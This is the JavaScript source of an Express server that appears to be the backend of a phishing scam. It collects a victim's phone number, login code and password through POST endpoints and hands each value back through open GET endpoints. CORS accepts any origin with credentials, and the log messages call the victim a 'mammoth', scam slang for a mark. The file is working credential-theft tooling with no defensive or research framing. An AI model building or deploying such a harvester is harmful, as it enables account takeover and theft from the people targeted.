const express = require('express');
const app = express();
const port = 3000;
const cors = require('cors');

// app.use((req, res, next) => {
    //     res.header('Access-Control-Allow-Origin', '*');
    //     res.header('Access-Control-Allow-Credentials', true);
//     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
//     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');

//     if (req.method === 'OPTIONS') {
//       res.sendStatus(200);
//     } else {
//       next();
//     }
//   });


app.use(express.json());

app.use(cors({
    origin: '*',
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
    credentials: true,
    optionsSuccessStatus: 204,
    allowedHeaders: ['Content-Type', 'Authorization'],
}));

var pn;
var code;
var pass;
app.post('/phone', (req, res) => {
    const phone_number = req.body.phone_number;
    if (typeof phone_number !== 'undefined') {
        pn = phone_number;
        console.log(`Номер телефона мамонта: ${phone_number}`);
        res.json({ message: `Номер телефона мамонта: ${phone_number}` });
        return;
    } else {
        console.log('Номер телефона мамонта неопределен.');
        res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
        return;
    }
});

app.get('/getPhone', (req, res) => {
    if(pn){
        res.send(`Номер телефона мамонта: ${pn}`);
        return 0;
    } else {
        res.status(404).send('Номер телефона мамонта не найден.');
        return 0;
    }
});

app.post('/authCode', (req, res) => {
    const value = req.body.value;
    if (typeof value !== 'undefined') {
        code = value;
        console.log(`Код мамонта: ${value}`);
        res.json({ message: `Код мамонта: ${value}` });
        return 0;
    } else {
        console.log('Код мамонта неопределен.');
        res.status(400).json({ error: 'Код мамонта неопределен.' });
        return 0;
    }
});

app.get('/getCode', (req, res) => {
    if(code){
        res.send(`Код мамонта:\n${code}`);
        return 0;
    } else {
        res.status(404).send('Код мамонта не найден.');
        return 0;
    }
});

app.post('/password', (req, res) => {
    const password = req.body.passwordInput;
    if (typeof password !== 'undefined') {
        pass = password;
        console.log(`Пароль мамонта: ${password}`);
        res.json({ message: `Пароль мамонта: ${password}` });
        return;
    } else {
        console.log('Пароль мамонта неопределен.');
        res.status(400).json({ error: 'Пароль мамонта неопределен.' });
        return;
    }
});

app.get('/getPassword', (req, res) => {
    if(pass){
        res.send(`Пароль мамонта: ${pass}`);
        return;
    } else {
        res.status(404).send('Пароль мамонта не найден.');
        return;
    }
});

app.get('/', (req, res) => {
    res.send('Salam Alejkum, Denis Penis!');
});

app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});
